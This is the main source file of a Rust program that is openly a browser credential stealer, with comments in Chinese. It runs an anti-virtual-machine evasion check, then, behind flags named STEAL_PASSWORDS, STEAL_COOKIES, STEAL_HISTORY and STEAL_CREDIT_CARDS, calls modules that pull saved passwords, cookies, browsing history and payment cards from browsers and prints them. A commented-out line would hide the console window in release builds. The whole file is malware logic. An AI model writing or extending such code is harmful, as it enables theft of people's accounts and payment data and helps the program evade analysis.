// #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
mod anti_analysis;
mod browser;
mod crypto;
mod constants;
use std::{path::PathBuf, fs};

fn main()->Result<(),Box<dyn std::error::Error>> {

    // let current_dir = std::env::current_dir()?;
    anti_analysis::detect(); //反虚拟机的相关操作
    if constants::STEAL_PASSWORDS {

        let a = String::from("bhrhger");
        println!("{}",a);
        let passwords = browser::get_passwords();
        if !passwords.is_empty() {
            println!("开始输出浏览器中的密码\n");
            for line in passwords{
                println!("{}",line);
            }}
    }

    if constants::STEAL_COOKIES {

        let cookies = browser::get_cookies();
        if !cookies.is_empty() {
            println!("开始输出浏览器中的cookies\n");
            for line in cookies{
                println!("{}",line);
            }
        }

    }

    if constants::STEAL_HISTORY {

        let history = browser::get_history();
        if !history.is_empty() {
            println!("开始输出浏览器中的history历史\n");
            for line in history{
                println!("{}",line);
            }
        }

    }

    if constants::STEAL_CREDIT_CARDS {

        let credit_cards = browser::get_credit_cards();
        if !credit_cards.is_empty() {
            println!("开始输出浏览器中的credit_cards历史\n");
            for line in credit_cards{
                println!("{}",line);
            }
        }
    }
    Ok(())
}


